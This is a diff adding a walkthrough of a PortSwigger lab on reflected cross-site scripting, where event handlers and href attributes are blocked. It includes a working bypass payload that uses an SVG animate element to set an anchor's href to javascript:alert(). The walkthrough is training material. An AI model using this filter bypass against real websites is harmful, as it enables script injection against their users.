@@ -6,6 +6,49 @@ ignore_macros: true
 
 # PortSwigger Web Academy
 
+## Cross-site scripting
+
+### Reflected XSS without attributes and href (UI:R)
+
+> Lab: [Lab: Reflected XSS with event handlers and href attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)
+
+**Goal:** This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.. Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example: `<a href="">Click me</a>`
+
+There is a search bar on the challenge that reflects the user input. However, the search bar only accepts `<a>`, `<svg>` and [SVG Elements](https://developer.mozilla.org/en-US/docs/Web/SVG/Element) tags.
+
+We cannot use any events (`onclick`, `on...`) and we cannot directly set the `href` attribute of an anchor. However we can create an [<animate\>](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/animate) tag inside SVGs. This HTML tag has the ability to set an attribute of the parent HTML tag.
+
+In the following example, the value of the attribute `rx` of the the `<rect>` tag is progressively changing from `0` to `5`, then from `5` to `0`.
+
+```html
+<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
+  <rect width="10" height="10">
+    <animate
+      attributeName="rx"
+      values="0;5;0"
+      dur="10s"
+      repeatCount="indefinite" />
+  </rect>
+</svg>
+```
+
+We can use this technique to set the value of the `href` attribute of an anchor to `javascript:alert()`. Example :
+
+```html
+<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+  <a>
+    <animate
+      attributeName="href"
+      values="javascript:alert()"
+      dur="indefinite"
+      repeatCount="indefinite" />
+     <text x="15" y="35" font-size="1em" fill="red">Click me<text>
+  </a>
+</svg>
+```
+
+The bot will click on the anchor (because of the `Click me` text) and solve the challenge !
+
 ## CORS
 
 ### Insecure CORS allows internal network attacks
